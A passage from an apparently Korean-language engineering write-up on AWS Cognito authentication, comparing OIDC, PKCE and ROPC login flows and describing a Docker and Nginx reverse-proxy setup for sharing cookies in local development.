<pre><code class="lang-javascript"><span class="hljs-comment">// Admin 그룹 생성</span>
aws cognito-idp create-group \
  --user-pool-id ap-northeast-2_XXXXX \
  --group-name <span class="hljs-variable constant_">ADMIN</span> \
  --description <span class="hljs-string">"Administrator group"</span> \
  --precedence <span class="hljs-number">1</span>

<span class="hljs-comment">// 사용자를 그룹에 추가</span>
aws cognito-idp admin-add-user-to-group \
  --user-pool-id ap-northeast-2_XXXXX \
  --username user@example.<span class="hljs-property">com</span> \
  --group-name <span class="hljs-variable constant_">ADMIN</span>

<span class="hljs-comment">// JWT 토큰에 자동으로 그룹 정보 포함</span>
{
  <span class="hljs-string">"sub"</span>: <span class="hljs-string">"a1b2c3d4-5678-90ab-cdef-1234567890ab"</span>,
  <span class="hljs-string">"email"</span>: <span class="hljs-string">"user@example.com"</span>,
  <span class="hljs-string">"cognito:groups"</span>: [<span class="hljs-string">"ADMIN"</span>],  <span class="hljs-comment">// 그룹 정보</span>
  <span class="hljs-string">"cognito:username"</span>: <span class="hljs-string">"user@example.com"</span>
}

<span class="hljs-comment">// Spring Backend에서 권한 확인</span>
@<span class="hljs-title class_">PreAuthorize</span>(<span class="hljs-string">"hasAuthority('ADMIN')"</span>)
@<span class="hljs-title class_">GetMapping</span>(<span class="hljs-string">"/admin/users"</span>)
public <span class="hljs-title class_">ResponseEntity</span>&lt;<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">UserDto</span>&gt;&gt; <span class="hljs-title function_">getUsers</span>(<span class="hljs-params"></span>) {
    <span class="hljs-comment">// ADMIN 그룹만 접근 가능</span>
}
</code></pre>
<h3 id="4-aws-서비스-가용성과-안정성">4. AWS 서비스 가용성과 안정성</h3>
<h4 id="aws-sla-service-level-agreement">AWS SLA (Service Level Agreement)</h4>
<pre><code class="lang-yaml"><span class="hljs-attr">Cognito User Pool:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">SLA:</span> <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">가동</span> <span class="hljs-string">시간</span> <span class="hljs-string">보장</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">다운타임:</span> <span class="hljs-string">월</span> <span class="hljs-number">43.8</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">리전</span> <span class="hljs-string">이중화:</span> <span class="hljs-string">자동</span> <span class="hljs-string">(Multi-AZ)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">백업:</span> <span class="hljs-string">자동</span> <span class="hljs-string">(AWS</span> <span class="hljs-string">관리)</span>

<span class="hljs-string">비교:</span> <span class="hljs-string">자체</span> <span class="hljs-string">구축</span> <span class="hljs-attr">EC2:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">SLA:</span> <span class="hljs-string">개발자</span> <span class="hljs-string">책임</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">다운타임:</span> <span class="hljs-string">배포,</span> <span class="hljs-string">패치</span> <span class="hljs-string">시</span> <span class="hljs-string">발생</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">이중화:</span> <span class="hljs-string">수동</span> <span class="hljs-string">구성</span> <span class="hljs-string">필요</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">백업:</span> <span class="hljs-string">수동</span> <span class="hljs-string">설정</span> <span class="hljs-string">및</span> <span class="hljs-string">관리</span>
</code></pre>
<h4 id="보안-인증">보안 인증</h4>
<pre><code class="lang-yaml"><span class="hljs-string">AWS</span> <span class="hljs-string">Cognito</span> <span class="hljs-string">인증:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">SOC</span> <span class="hljs-number">2</span> <span class="hljs-string">Type</span> <span class="hljs-string">II</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">ISO</span> <span class="hljs-number">27001</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">PCI</span> <span class="hljs-string">DSS</span> <span class="hljs-string">Level</span> <span class="hljs-number">1</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">HIPAA</span> <span class="hljs-string">Eligible</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">GDPR</span> <span class="hljs-string">Compliant</span>

<span class="hljs-string">자체</span> <span class="hljs-string">구축</span> <span class="hljs-string">시:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">모든</span> <span class="hljs-string">인증</span> <span class="hljs-string">직접</span> <span class="hljs-string">획득</span> <span class="hljs-string">필요</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">연간</span> <span class="hljs-string">감사</span> <span class="hljs-string">비용:</span> <span class="hljs-string">$10,000+</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">컴플라이언스</span> <span class="hljs-string">전담</span> <span class="hljs-string">인력</span> <span class="hljs-string">필요</span>
</code></pre>
<hr></hr>
<h2 id="cognito-인증-방식-비교">Cognito 인증 방식 비교</h2>
<h3 id="1-oidc-openid-connect">1. OIDC (OpenID Connect)</h3>
<h4 id="표준-authorization-code-flow">표준 Authorization Code Flow</h4>
<pre><code>1. 사용자 → Cognito Hosted UI 리다이렉트
   https://myapp.auth.ap-northeast-2.amazoncognito.com/login?
     client_id=abc123&amp;
     response_type=code&amp;
     redirect_uri=https://accounts.ddcn41.com/callback

2. 사용자 → Hosted UI에서 로그인

3. Cognito → Redirect with Authorization Code
   https://accounts.ddcn41.com/callback?code=xyz789

4. Frontend → Lambda Auth Gateway
   POST /auth/callback
   Body: { code: 'xyz789' }

5. Lambda → Cognito Token Exchange
   POST https://myapp.auth.ap-northeast-2.amazoncognito.com/oauth2/token
   Body: {
     grant_type: 'authorization_code',
     code: 'xyz789',
     client_id: 'abc123',
     redirect_uri: 'https://accounts.ddcn41.com/callback'
   }

6. Cognito → Lambda
   {
     access_token: 'eyJhbGc...',
     id_token: 'eyJhbGc...',
     refresh_token: 'eyJhbGc...',
     expires_in: 3600
   }

7. Lambda → Frontend (Set HttpOnly Cookies)
   Set-Cookie: access_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com
   Set-Cookie: id_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com
   Set-Cookie: refresh_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com; Max-Age=2592000
</code></pre><p><strong>장점</strong>:</p>
<ul>
<li>✅ 가장 안전한 방식 (Authorization Code는 일회용)</li>
<li>✅ PKCE 추가 시 더욱 강화</li>
<li>✅ Refresh Token 지원</li>
<li>✅ Hosted UI로 빠른 구현</li>
</ul>
<p><strong>단점</strong>:</p>
<ul>
<li>⚠️ Hosted UI 커스터마이징 제한</li>
<li>⚠️ 리다이렉트 플로우 (UX 다소 복잡)</li>
</ul>
<h3 id="2-oidc--pkce-proof-key-for-code-exchange">2. OIDC + PKCE (Proof Key for Code Exchange)</h3>
<h4 id="pkce-추가-단계">PKCE 추가 단계</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// 1. Frontend에서 Code Verifier 생성 (무작위 문자열)</span>
<span class="hljs-keyword">const</span> codeVerifier = <span class="hljs-title function_">generateRandomString</span>(<span class="hljs-number">128</span>);
<span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'code_verifier'</span>, codeVerifier);

<span class="hljs-comment">// 2. Code Challenge 생성 (SHA-256 해시)</span>
<span class="hljs-keyword">const</span> codeChallenge = <span class="hljs-title function_">base64UrlEncode</span>(<span class="hljs-title function_">sha256</span>(codeVerifier));

<span class="hljs-comment">// 3. Cognito Hosted UI 리다이렉트 (code_challenge 포함)</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//myapp.auth.ap-northeast-2.amazoncognito.com/login?</span>
  client_id=abc123&amp;
  response_type=code&amp;
  redirect_uri=<span class="hljs-attr">https</span>:<span class="hljs-comment">//accounts.ddcn41.com/callback&amp;</span>
  code_challenge=<span class="hljs-variable constant_">CHALLENGE_STRING</span>&amp;
  code_challenge_method=<span class="hljs-variable constant_">S256</span>

<span class="hljs-comment">// 4. Authorization Code 받은 후 Token Exchange 시 Code Verifier 포함</span>
<span class="hljs-variable constant_">POST</span> /oauth2/token
<span class="hljs-title class_">Body</span>: {
  <span class="hljs-attr">grant_type</span>: <span class="hljs-string">'authorization_code'</span>,
  <span class="hljs-attr">code</span>: <span class="hljs-string">'xyz789'</span>,
  <span class="hljs-attr">client_id</span>: <span class="hljs-string">'abc123'</span>,
  <span class="hljs-attr">redirect_uri</span>: <span class="hljs-string">'https://accounts.ddcn41.com/callback'</span>,
  <span class="hljs-attr">code_verifier</span>: <span class="hljs-variable constant_">CODE_VERIFIER</span>  <span class="hljs-comment">// ✅ PKCE 검증</span>
}

<span class="hljs-comment">// Cognito는 code_challenge와 code_verifier를 비교하여 검증</span>
<span class="hljs-comment">// SHA-256(code_verifier) === code_challenge</span>
</code></pre>
<p><strong>PKCE의 보안 강화</strong>:</p>
<pre><code>공격 시나리오 (PKCE 없이):
  1. 공격자가 Authorization Code 가로챔 (xyz789)
  2. 공격자가 직접 Token Exchange 시도
  3. ✅ 성공 (client_id만 알면 가능)

PKCE 사용 시:
  1. 공격자가 Authorization Code 가로챔 (xyz789)
  2. 공격자가 Token Exchange 시도
  3. ❌ 실패 (code_verifier를 모름)
  4. code_verifier는 Frontend에만 존재 (공격자 접근 불가)
</code></pre><p><strong>장점</strong>:</p>
<ul>
<li>✅ Authorization Code Interception 공격 방어</li>
<li>✅ Public Client (SPA)에 최적</li>
<li>✅ OAuth 2.1에서 권장</li>
</ul>
<p><strong>단점</strong>:</p>
<ul>
<li>⚠️ Hosted UI 커스터마이징 여전히 제한</li>
</ul>
<h3 id="3-ropc-resource-owner-password-credentials">3. ROPC (Resource Owner Password Credentials)</h3>
<h4 id="direct-password-flow">Direct Password Flow</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Frontend에서 직접 Cognito로 로그인</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> cognitoClient.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitiateAuthCommand</span>({
  <span class="hljs-title class_">AuthFlow</span>: <span class="hljs-string">'USER_PASSWORD_AUTH'</span>,  <span class="hljs-comment">// ROPC</span>
  <span class="hljs-title class_">ClientId</span>: <span class="hljs-string">'abc123'</span>,
  <span class="hljs-title class_">AuthParameters</span>: {
    <span class="hljs-attr">USERNAME</span>: <span class="hljs-string">'user@example.com'</span>,
    <span class="hljs-attr">PASSWORD</span>: <span class="hljs-string">'SecurePass123!'</span>
  }
}));

<span class="hljs-comment">// 즉시 토큰 반환 (리다이렉트 없음)</span>
{
  <span class="hljs-title class_">AuthenticationResult</span>: {
    <span class="hljs-title class_">AccessToken</span>: <span class="hljs-string">'eyJhbGc...'</span>,
    <span class="hljs-title class_">IdToken</span>: <span class="hljs-string">'eyJhbGc...'</span>,
    <span class="hljs-title class_">RefreshToken</span>: <span class="hljs-string">'eyJhbGc...'</span>,
    <span class="hljs-title class_">ExpiresIn</span>: <span class="hljs-number">3600</span>
  }
}

<span class="hljs-comment">// Lambda Auth Gateway로 전달하여 쿠키 설정</span>
<span class="hljs-variable constant_">POST</span> /v2/auth/login
<span class="hljs-title class_">Body</span>: { <span class="hljs-attr">email</span>: <span class="hljs-string">'user@example.com'</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">'SecurePass123!'</span> }

<span class="hljs-comment">// Lambda 응답</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=eyJhbGc...; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>
</code></pre>
<p><strong>장점</strong>:</p>
<ul>
<li>✅ 커스텀 UI 완전 자유</li>
<li>✅ 리다이렉트 없음 (UX 단순)</li>
<li>✅ QuickFill 등 개발 편의 기능 구현 가능</li>
</ul>
<p><strong>단점</strong>:</p>
<ul>
<li>❌ OAuth 2.0에서 Deprecated</li>
<li>❌ 보안성 낮음 (비밀번호 직접 전송)</li>
<li>❌ Third-party 앱에 부적합</li>
</ul>
<p><strong>ROPC가 Deprecated된 이유</strong>:</p>
<pre><code>1. 피싱 위험:
   - 사용자가 제3자 앱에 비밀번호 직접 입력
   - 제3자 앱이 비밀번호를 저장할 수 있음

2. MFA 미지원:
   - ROPC는 Multi-Factor Authentication 불가
   - Authorization Code Flow는 MFA 자연스럽게 지원

3. 권한 범위 제어 어려움:
   - ROPC는 전체 권한 부여
   - Authorization Code Flow는 Scope로 세밀한 권한 제어
</code></pre><p><strong>우리 프로젝트에서 ROPC를 선택한 이유</strong>:</p>
<pre><code class="lang-yaml"><span class="hljs-string">이유:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">기존</span> <span class="hljs-string">구현이</span> <span class="hljs-string">이메일</span> <span class="hljs-string">+</span> <span class="hljs-string">비밀번호</span> <span class="hljs-string">방식</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">테스트</span> <span class="hljs-string">빌드에서</span> <span class="hljs-string">QuickFill</span> <span class="hljs-string">기능</span> <span class="hljs-string">필요</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">커스텀</span> <span class="hljs-string">UI</span> <span class="hljs-string">구현</span> <span class="hljs-string">필요</span> <span class="hljs-string">(로그인</span> <span class="hljs-string">페이지</span> <span class="hljs-string">디자인</span> <span class="hljs-string">자유도)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">자사</span> <span class="hljs-string">앱이므로</span> <span class="hljs-string">피싱</span> <span class="hljs-string">위험</span> <span class="hljs-string">낮음</span>

<span class="hljs-string">향후</span> <span class="hljs-string">계획:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">Production:</span> <span class="hljs-string">OIDC</span> <span class="hljs-string">+</span> <span class="hljs-string">PKCE로</span> <span class="hljs-string">전환</span> <span class="hljs-string">고려</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Hosted</span> <span class="hljs-string">UI</span> <span class="hljs-string">또는</span> <span class="hljs-string">Amplify</span> <span class="hljs-string">UI</span> <span class="hljs-string">사용</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">MFA</span> <span class="hljs-string">지원</span>
</code></pre>
<h3 id="4-인증-방식-비교표">4. 인증 방식 비교표</h3>
<table>
<thead>
<tr>
<th>특성</th>
<th>OIDC (Authorization Code)</th>
<th>OIDC + PKCE</th>
<th>ROPC</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>보안성</strong></td>
<td>⭐⭐⭐⭐</td>
<td>⭐⭐⭐⭐⭐</td>
<td>⭐⭐</td>
</tr>
<tr>
<td><strong>UX 복잡도</strong></td>
<td>중간 (리다이렉트)</td>
<td>중간 (리다이렉트)</td>
<td>낮음 (즉시 로그인)</td>
</tr>
<tr>
<td><strong>커스터마이징</strong></td>
<td>제한적 (Hosted UI)</td>
<td>제한적 (Hosted UI)</td>
<td>완전 자유</td>
</tr>
<tr>
<td><strong>MFA 지원</strong></td>
<td>✅</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td><strong>Social Login</strong></td>
<td>✅</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td><strong>Refresh Token</strong></td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td><strong>Third-party 적합</strong></td>
<td>✅</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td><strong>OAuth 2.1 권장</strong></td>
<td>✅</td>
<td>✅</td>
<td>❌ (Deprecated)</td>
</tr>
</tbody>
</table>
<hr></hr>
<h2 id="로컬-개발-환경의-제약과-해결">로컬 개발 환경의 제약과 해결</h2>
<h3 id="1-localhost-포트-분리-문제">1. localhost 포트 분리 문제</h3>
<h4 id="문제-상황">문제 상황</h4>
<pre><code>로컬 개발 환경:
  localhost:3000  → Client Frontend (Vite)
  localhost:3001  → Admin Frontend (Vite)
  localhost:3002  → Accounts Frontend (Vite)
  localhost:8080  → Queue Service (Spring)
  localhost:8081  → Main Service (Spring)
  localhost:4000  → Lambda Auth Mock (Node.js)

쿠키 설정:
  Set-Cookie: access_token=eyJhbGc...; Domain=localhost; HttpOnly; Secure;

  ❌ localhost:3000에서 설정한 쿠키는 localhost:3001에서 접근 불가
  ❌ 포트가 다르면 다른 Origin으로 간주
</code></pre><h4 id="same-origin-policy-엄격-적용">Same-Origin Policy 엄격 적용</h4>
<pre><code>Origin 비교:
  http://localhost:3000  → Origin 1
  http://localhost:3001  → Origin 2 (다름)
  http://localhost:3002  → Origin 3 (다름)

→ 각 Origin의 쿠키는 완전히 독립적
→ Domain=localhost로 설정해도 포트 구분됨
</code></pre><h3 id="2-cognito-https-강제-정책">2. Cognito HTTPS 강제 정책</h3>
<h4 id="redirect-url-제약">Redirect URL 제약</h4>
<pre><code class="lang-bash"><span class="hljs-comment"># Cognito User Pool Client 설정</span>
aws cognito-idp update-user-pool-client \
  --user-pool-id ap-northeast-2_XXXXX \
  --client-id abc123 \
  --callback-urls \
    <span class="hljs-string">"https://accounts.ddcn41.com/callback"</span>  ✅ HTTPS
    <span class="hljs-string">"http://localhost:3002/callback"</span>        ❌ HTTP (Cognito가 거부)
</code></pre>
<p><strong>Cognito의 HTTPS 강제 이유</strong>:</p>
<pre><code>1. Authorization Code가 URL에 노출
   http://localhost:3002/callback?code=xyz789
   → HTTP는 평문 전송 (중간자 공격 위험)

2. 토큰 교환 시 client_secret 전송
   → HTTP는 탈취 위험

3. OAuth 2.0 보안 권장사항
   → HTTPS 필수
</code></pre><h4 id="localhost-https-설정의-어려움">localhost HTTPS 설정의 어려움</h4>
<pre><code class="lang-bash"><span class="hljs-comment"># 1. Self-Signed Certificate (브라우저 경고)</span>
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
<span class="hljs-comment"># → 브라우저: "이 사이트는 안전하지 않습니다"</span>

<span class="hljs-comment"># 2. mkcert (로컬 CA 신뢰)</span>
mkcert -install
mkcert localhost
<span class="hljs-comment"># → 브라우저: 경고 없음</span>
<span class="hljs-comment"># → 각 개발자 환경마다 설정 필요</span>
<span class="hljs-comment"># → CI/CD 환경에서 추가 설정</span>

<span class="hljs-comment"># 3. Cognito Redirect URL 등록</span>
aws cognito-idp update-user-pool-client \
  --callback-urls <span class="hljs-string">"https://localhost:3002/callback"</span>
<span class="hljs-comment"># → Secure 플래그 필수</span>
</code></pre>
<h3 id="3-해결-방법-docker--nginx-reverse-proxy">3. 해결 방법: Docker + Nginx Reverse Proxy</h3>
<h4 id="아키텍처">아키텍처</h4>
<pre><code>┌─────────────────────────────────────────┐
│   Nginx Reverse Proxy (Docker)         │
│   http://app.local (또는 HTTPS)         │
└───────────────┬─────────────────────────┘
                │
    ┌───────────┼───────────┬───────────┐
    │           │           │           │
    ▼           ▼           ▼           ▼
┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐
│ Client │ │ Admin  │ │Accounts│ │Backend │
│ :3000  │ │ :3001  │ │ :3002  │ │ :8080  │
└────────┘ └────────┘ └────────┘ └────────┘
</code></pre><h4 id="docker-composeyml">docker-compose.yml</h4>
<pre><code class="lang-yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">nginx:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:alpine</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"80:80"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"443:443"</span>  <span class="hljs-comment"># HTTPS (mkcert 사용 시)</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx.conf:/etc/nginx/nginx.conf:ro</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./certs:/etc/nginx/certs:ro</span>  <span class="hljs-comment"># mkcert 인증서</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">client</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">accounts</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">lambda-mock</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># Frontend 서비스들은 Host Network로 실행</span>
  <span class="hljs-comment"># (Vite Dev Server는 Docker 밖에서 실행)</span>

<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">app-network:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">bridge</span>
</code></pre>
<h4 id="nginxconf">nginx.conf</h4>
<pre><code class="lang-nginx"><span class="hljs-section">http</span> {
    <span class="hljs-section">upstream</span> client_frontend {
        <span class="hljs-attribute">server</span> host.docker.internal:<span class="hljs-number">3000</span>;  <span class="hljs-comment"># Mac/Windows</span>
        <span class="hljs-comment"># server 172.17.0.1:3000;          # Linux</span>
    }
    <span class="hljs-section">upstream</span> admin_frontend {
        <span class="hljs-attribute">server</span> host.docker.internal:<span class="hljs-number">3001</span>;
    }
    <span class="hljs-section">upstream</span> accounts_frontend {
        <span class="hljs-attribute">server</span> host.docker.internal:<span class="hljs-number">3002</span>;
    }
    <span class="hljs-section">upstream</span> backend_api {
        <span class="hljs-attribute">server</span> host.docker.internal:<span class="hljs-number">8080</span>;
    }
    <span class="hljs-section">upstream</span> lambda_auth {
        <span class="hljs-attribute">server</span> host.docker.internal:<span class="hljs-number">4000</span>;
    }

    <span class="hljs-section">server</span> {
        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;
        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;  <span class="hljs-comment"># HTTPS</span>
        <span class="hljs-attribute">server_name</span> app.local;

        <span class="hljs-comment"># SSL 설정 (mkcert)</span>
        <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/certs/app.local.pem;
        <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/certs/app.local-key.pem;

        <span class="hljs-comment"># Client App</span>
        <span class="hljs-section">location</span> /client {
            <span class="hljs-attribute">proxy_pass</span> http://client_frontend/;
            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
            <span class="hljs-attribute">proxy_set_header</span> Cookie <span class="hljs-variable">$http_cookie</span>;

            <span class="hljs-comment"># WebSocket (Vite HMR)</span>
            <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;
            <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;
            <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">"upgrade"</span>;
        }

        <span class="hljs-comment"># Admin App</span>
        <span class="hljs-section">location</span> /admin {
            <span class="hljs-attribute">proxy_pass</span> http://admin_frontend/;
            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
            <span class="hljs-attribute">proxy_set_header</span> Cookie <span class="hljs-variable">$http_cookie</span>;

            <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;
            <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;
            <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">"upgrade"</span>;
        }

        <span class="hljs-comment"># Accounts App</span>
        <span class="hljs-section">location</span> /accounts {
            <span class="hljs-attribute">proxy_pass</span> http://accounts_frontend/;
            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
            <span class="hljs-attribute">proxy_set_header</span> Cookie <span class="hljs-variable">$http_cookie</span>;

            <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;
            <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;
            <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">"upgrade"</span>;
        }

        <span class="hljs-comment"># Backend API</span>
        <span class="hljs-section">location</span> /api {
            <span class="hljs-attribute">proxy_pass</span> http://backend_api/v1;
            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
            <span class="hljs-attribute">proxy_set_header</span> Cookie <span class="hljs-variable">$http_cookie</span>;
        }

        <span class="hljs-comment"># Lambda Auth Mock</span>
        <span class="hljs-section">location</span> /auth {
            <span class="hljs-attribute">proxy_pass</span> http://lambda_auth/v2/auth;
            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
            <span class="hljs-attribute">proxy_set_header</span> Cookie <span class="hljs-variable">$http_cookie</span>;
        }
    }
}
</code></pre>
<h4 id="etchosts-설정">/etc/hosts 설정</h4>
<pre><code class="lang-bash"><span class="hljs-comment"># Mac/Linux</span>
<span class="hljs-built_in">sudo</span> sh -c <span class="hljs-string">'echo "127.0.0.1  app.local" &gt;&gt; /etc/hosts'</span>

<span class="hljs-comment"># Windows (관리자 권한 CMD)</span>
<span class="hljs-built_in">echo</span> 127.0.0.1  app.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts
</code></pre>
<h4 id="쿠키-설정-lambda-mock">쿠키 설정 (Lambda Mock)</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Lambda Auth Mock 응답</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// ...로그인 검증...</span>

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">statusCode</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'http://app.local'</span>,
      <span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>,
    },
    <span class="hljs-attr">cookies</span>: [
      <span class="hljs-string">`access_token=<span class="hljs-subst">${accessToken}</span>; Domain=.app.local; HttpOnly; Path=/; Max-Age=3600`</span>,
      <span class="hljs-string">`id_token=<span class="hljs-subst">${idToken}</span>; Domain=.app.local; HttpOnly; Path=/; Max-Age=3600`</span>,
      <span class="hljs-string">`refresh_token=<span class="hljs-subst">${refreshToken}</span>; Domain=.app.local; HttpOnly; Path=/; Max-Age=2592000`</span>
    ],
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'Login successful'</span> })
  };
}
</code></pre>
<h4 id="실행-방법">실행 방법</h4>
<pre><code class="lang-bash"><span class="hljs-comment"># 1. Nginx 시작</span>
docker-compose up -d nginx

<span class="hljs-comment"># 2. Frontend 앱들 실행 (별도 터미널)</span>
<span class="hljs-built_in">cd</span> frontend
pnpm dev:client   <span class="hljs-comment"># localhost:3000</span>
pnpm dev:admin    <span class="hljs-comment"># localhost:3001</span>
pnpm dev:accounts <span class="hljs-comment"># localhost:3002</span>

<span class="hljs-comment"># 3. Backend 실행</span>
<span class="hljs-built_in">cd</span> backend
./gradlew bootRun  <span class="hljs-comment"># localhost:8080</span>

<span class="hljs-comment"># 4. Lambda Mock 실행</span>
<span class="hljs-built_in">cd</span> backend/lambda/auth-gateway
npm start  <span class="hljs-comment"># localhost:4000</span>

<span class="hljs-comment"># 5. 브라우저에서 접근</span>
<span class="hljs-comment"># http://app.local/client</span>
<span class="hljs-comment"># http://app.local/admin</span>
<span class="hljs-comment"># http://app.local/accounts</span>

<span class="hljs-comment"># 쿠키가 .app.local 도메인으로 공유됨!</span>
</code></pre>
<h3 id="4-cognito-hosted-ui-로컬-테스트">4. Cognito Hosted UI 로컬 테스트</h3>
<h4 id="callback-url-등록">Callback URL 등록</h4>
<pre><code class="lang-bash"><span class="hljs-comment"># Cognito User Pool Client 설정</span>
aws cognito-idp update-user-pool-client \
  --user-pool-id ap-northeast-2_XXXXX \
  --client-id abc123 \
  --callback-urls \
    <span class="hljs-string">"https://app.local/accounts/callback"</span>  <span class="hljs-comment"># mkcert HTTPS 필요</span>
    <span class="hljs-string">"http://localhost/accounts/callback"</span>   <span class="hljs-comment"># 포트 없는 localhost (불안정)</span>
</code></pre>
<p><strong>주의사항</strong>:</p>
<ol>
<li><strong>HTTPS 필수</strong>: <code>https://app.local</code> (mkcert로 인증서 생성)</li>
<li><strong>Secure 플래그</strong>: 쿠키에 <code>Secure</code> 플래그 필수</li>
<li><strong>Localhost 포트</strong>: <code>http://localhost:3002</code>는 작동 안 함</li>
</ol>
<hr></hr>
<h2 id="주의사항-및-best-practices">주의사항 및 Best Practices</h2>
<h3 id="1-hosted-ui-로그아웃-시-쿠키-제거">1. Hosted UI 로그아웃 시 쿠키 제거</h3>
<h4 id="문제-상황">문제 상황</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// 사용자가 로그아웃 버튼 클릭</span>
<span class="hljs-comment">// Lambda Auth Gateway → Cognito Logout URL 리다이렉트</span>
